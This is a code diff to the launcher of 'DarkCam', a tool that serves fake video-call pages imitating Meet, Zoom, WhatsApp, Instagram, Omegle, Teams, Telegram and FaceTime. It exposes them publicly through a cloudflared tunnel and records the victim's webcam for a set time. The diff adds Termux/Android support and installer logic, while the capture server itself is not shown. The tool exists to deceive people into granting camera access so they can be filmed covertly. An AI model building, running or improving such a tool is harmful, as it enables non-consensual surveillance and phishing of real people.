@@ -11,6 +11,7 @@ import argparse
 import subprocess
 import threading
 import signal
+import re
 
 _G = "\033[38;5;196m"   # neon red
 _O = "\033[38;5;208m"   # neon orange
@@ -18,6 +19,12 @@ _W = "\033[38;5;255m"   # bright white
 _D = "\033[38;5;240m"   # dim grey
 _B = "\033[1m"          # bold
 _R = "\033[0m"          # reset
+
+# ── Environment detection ──
+IS_TERMUX = "com.termux" in os.environ.get("PREFIX", "") or \
+            os.path.exists("/data/data/com.termux")
+PREFIX     = os.environ.get("PREFIX", "/usr")
+BIN_DIR    = os.path.join(PREFIX, "bin")
 
 BANNER = f"""
 {_G} ▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀{_O}  ▄████▄   ▄▄▄       ███▄ ▄███▓{_R}
@@ -38,21 +45,50 @@ BANNER = f"""
 {_D}        └──────────────────────────────────────────────────────────────┘{_R}
 """
 
+def install_deps():
+    req_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "requirements.txt")
+    print(f"  {_O}[*]{_R} Checking dependencies...")
+    if IS_TERMUX:
+        # Termux mein --break-system-packages nahi chahiye
+        subprocess.run(
+            [sys.executable, "-m", "pip", "install", "-r", req_path, "-q"],
+            check=True
+        )
+    else:
+        subprocess.run(
+            [sys.executable, "-m", "pip", "install", "-r", req_path, "-q", "--break-system-packages"],
+            check=True
+        )
+
 def check_cloudflared():
     result = subprocess.run(["which", "cloudflared"], capture_output=True)
     if result.returncode != 0:
         print(f"{_O}  [!] cloudflared not found. Installing...{_R}")
         arch = subprocess.check_output(["uname", "-m"], text=True).strip()
-        binary = "cloudflared-linux-arm64" if "arm" in arch or "aarch" in arch else "cloudflared-linux-amd64"
+
+        if IS_TERMUX:
+            # Termux pe pkg se install karo
+            try:
+                subprocess.run(["pkg", "install", "-y", "cloudflared"], check=True)
+                print(f"{_G}  [+] cloudflared installed via pkg.{_R}")
+                return
+            except Exception:
+                pass
+            # fallback: ARM binary download
+            binary = "cloudflared-linux-arm64"
+            dest = os.path.join(BIN_DIR, "cloudflared")
+        else:
+            binary = "cloudflared-linux-arm64" if ("arm" in arch or "aarch" in arch) else "cloudflared-linux-amd64"
+            dest = "/usr/local/bin/cloudflared"
+
         subprocess.run(
             f"curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/{binary} "
-            f"-o /usr/local/bin/cloudflared && chmod +x /usr/local/bin/cloudflared",
+            f"-o {dest} && chmod +x {dest}",
             shell=True, check=True
         )
         print(f"{_G}  [+] cloudflared installed.{_R}")
 
-def start_tunnel(port: int) -> str:
-    """Start cloudflared tunnel and return the public URL."""
+def start_tunnel(port: int):
     proc = subprocess.Popen(
         ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
         stdout=subprocess.PIPE,
@@ -60,8 +96,7 @@ def start_tunnel(port: int) -> str:
         text=True
     )
     url = None
-    import re
-    # URL appears in stderr
+
     def read_stderr():
         nonlocal url
         for line in proc.stderr:
@@ -72,11 +107,12 @@ def start_tunnel(port: int) -> str:
 
     t = threading.Thread(target=read_stderr, daemon=True)
     t.start()
-    t.join(timeout=20)
+    t.join(timeout=25)
     return url, proc
 
 def start_flask(page: str, port: int):
-    """Start Flask server in a thread."""
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    sys.path.insert(0, script_dir)
     import server as srv
     srv.app.config["LURE_PAGE"] = page
 
@@ -85,12 +121,14 @@ def start_flask(page: str, port: int):
 
     t = threading.Thread(target=run, daemon=True)
     t.start()
-    time.sleep(1.5)  # let flask boot
+    time.sleep(1.5)
 
 def print_info(url: str, page: str, port: int, duration: int):
+    env_label = f"{_O}Termux (Android){_R}" if IS_TERMUX else f"{_W}Linux{_R}"
     print(f"\n{_D}  ┌──────────────────────────────────────────────────────┐{_R}")
     print(f"{_D}  │{_R}  {_O}{_B}🎥 DARKCAM ACTIVE{_R}                                      {_D}│{_R}")
     print(f"{_D}  ├──────────────────────────────────────────────────────┤{_R}")
+    print(f"{_D}  │{_R}  {_D}Platform    :{_R}  {env_label}")
     print(f"{_D}  │{_R}  {_D}Lure Page   :{_R}  {_O}{page.upper()}{_R}")
     print(f"{_D}  │{_R}  {_D}Local URL   :{_R}  http://localhost:{port}")
     print(f"{_D}  │{_R}  {_D}Public URL  :{_R}  {_W}{url}{_R}")
@@ -102,7 +140,8 @@ def print_info(url: str, page: str, port: int, duration: int):
 
 def main():
     parser = argparse.ArgumentParser(description="DarkCam — Webcam Video Capture Tool")
-    parser.add_argument("--page", choices=["meet", "zoom", "whatsapp", "instagram", "omegle", "teams", "telegram", "facetime"], default="meet", help="Lure page template")
+    parser.add_argument("--page", choices=["meet","zoom","whatsapp","instagram","omegle","teams","telegram","facetime"],
+                        default="meet", help="Lure page template")
     parser.add_argument("--port", type=int, default=8080, help="Local server port")
     parser.add_argument("--duration", type=int, default=45, help="Recording duration in seconds")
     parser.add_argument("--no-tunnel", action="store_true", help="Skip cloudflared, use local only")
@@ -110,10 +149,10 @@ def main():
 
     print(BANNER)
 
-    # install deps
-    print(f"  {_O}[*]{_R} Checking dependencies...")
-    req_path = os.path.join(os.path.dirname(__file__), "requirements.txt")
-    subprocess.run([sys.executable, "-m", "pip", "install", "-r", req_path, "-q", "--break-system-packages"], check=True)
+    if IS_TERMUX:
+        print(f"  {_O}[*]{_R} Termux environment detected.")
+
+    install_deps()
 
     if not args.no_tunnel:
         check_cloudflared()
